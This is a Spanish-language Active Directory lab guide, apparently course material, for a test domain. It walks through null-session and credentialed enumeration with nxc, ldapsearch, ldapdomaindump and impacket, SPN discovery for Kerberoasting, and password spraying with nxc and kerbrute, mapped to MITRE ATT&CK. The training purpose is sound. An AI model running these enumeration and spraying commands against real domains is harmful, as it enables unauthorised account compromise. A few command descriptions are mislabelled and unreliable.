# Lab 01 — Enumeración de Active Directory

## Objetivo

Recolectar información del dominio sin credenciales (null session) y con credenciales válidas: usuarios, grupos, políticas, SPNs y relaciones de confianza.

**DC:** `192.168.100.10` | **Dominio:** `LABTHINKTANK.LOCAL`

---

## Parte 1 — Reconocimiento inicial sin credenciales

```bash
# Verificar conectividad y versión SMB
nxc smb 192.168.100.10

# Obtener información del dominio via SMB (null session)
nxc smb 192.168.100.10 --shares
nxc smb 192.168.100.10 -u '' -p '' --shares

# enum4linux-ng — enumeración completa por null session
enum4linux-ng 192.168.100.10

# Enumerar con smbclient
smbclient -L //192.168.100.10 -N
smbclient //192.168.100.10/SYSVOL -N
```

---

## Parte 2 — Enumeración LDAP

```bash
# Consulta LDAP anónima (si está permitida)
ldapsearch -x -H ldap://192.168.100.10 -b "" -s base

# Con credenciales — info del dominio
ldapsearch -x -H ldap://192.168.100.10 \
    -D "jgarcia@labthinktank.local" -w "Password123!" \
    -b "DC=labthinktank,DC=local" \
    "(objectClass=domain)" \
    | grep -iE "dc=|domain|functional"

# Listar todos los usuarios
ldapsearch -x -H ldap://192.168.100.10 \
    -D "jgarcia@labthinktank.local" -w "Password123!" \
    -b "DC=labthinktank,DC=local" \
    "(objectClass=user)" \
    sAMAccountName displayName memberOf userAccountControl \
    | grep -iE "sAMAccountName|displayName|memberOf"

# Listar grupos y miembros
ldapsearch -x -H ldap://192.168.100.10 \
    -D "jgarcia@labthinktank.local" -w "Password123!" \
    -b "DC=labthinktank,DC=local" \
    "(objectClass=group)" cn member \
    | grep -iE "cn:|member:"
```

### ldapdomaindump — volcado estructurado

```bash
# Exporta toda la información LDAP en HTML y JSON
ldapdomaindump -u "labthinktank.local\jgarcia" -p "Password123!" \
    192.168.100.10 -o /workspace/reports/ldap_dump/

# Archivos generados:
# domain_users.html    → tabla de usuarios con flags
# domain_groups.html   → grupos y membresías
# domain_computers.html
# domain_policy.html   → políticas de contraseñas
```

---

## Parte 3 — Enumeración con NetExec (nxc)

```bash
# Enumerar usuarios del dominio
nxc smb 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --users

# Enumerar grupos
nxc smb 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --groups

# Miembros de Domain Admins
nxc smb 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --groups "Domain Admins"

# Listar shares accesibles
nxc smb 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --shares

# Política de contraseñas
nxc smb 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --pass-pol

# Enumerar sesiones activas
nxc smb 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --sessions

# Enumerar via LDAP
nxc ldap 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --users --groups
```

---

## Parte 4 — Enumeración de SPNs (base para Kerberoasting)

```bash
# Listar todos los SPNs del dominio (impacket)
GetUserSPNs.py labthinktank.local/jgarcia:Password123! \
    -dc-ip 192.168.100.10 -no-pass -list

# Usando ldapsearch
ldapsearch -x -H ldap://192.168.100.10 \
    -D "jgarcia@labthinktank.local" -w "Password123!" \
    -b "DC=labthinktank,DC=local" \
    "(servicePrincipalName=*)" \
    sAMAccountName servicePrincipalName \
    | grep -iE "sAMAccountName|servicePrincipalName"
```

---

## Parte 5 — Password Spraying

```bash
# Verificar política de contraseñas ANTES de hacer spray
nxc smb 192.168.100.10 -u jgarcia -p "Password123!" --pass-pol
# Observar: lockout threshold y observation window

# Spray con una contraseña (respetar el threshold)
nxc smb 192.168.100.10 \
    -u /workspace/users.txt \
    -p "Password123!" \
    --continue-on-success

# Generar lista de usuarios desde el dump anterior
ldapsearch ... "(objectClass=user)" sAMAccountName \
    | grep sAMAccountName | awk '{print $2}' > /workspace/users.txt

# Kerbrute — spray sin bloquear (valida via Kerberos)
kerbrute passwordspray \
    --dc 192.168.100.10 \
    --domain labthinktank.local \
    /workspace/users.txt "Password123!"
```

---

## Parte 6 — Impacket scripts de enumeración

```bash
# Información del dominio
GetADUsers.py labthinktank.local/jgarcia:Password123! \
    -dc-ip 192.168.100.10 -all

# Listar domain controllers
GetDomainSID.py labthinktank.local/jgarcia:Password123! \
    -dc-ip 192.168.100.10

# Enumerar relaciones de confianza
nxc ldap 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --trusted-for-delegation
```

---

## Actividades

1. Realizar null session y documentar qué información se obtiene sin credenciales
2. Con `ldapdomaindump`, generar el reporte completo del dominio
3. Identificar todos los usuarios con SPN configurado
4. Realizar password spray con las contraseñas `Password123!` y `Summer2024!`
5. Documentar la política de contraseñas del dominio (mínimo de caracteres, lockout)

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| Account Discovery | T1087.002 — Domain Account |
| Permission Groups Discovery | T1069.002 — Domain Groups |
| Network Share Discovery | T1135 |
| Password Policy Discovery | T1201 |
| Brute Force — Password Spraying | T1110.003 |
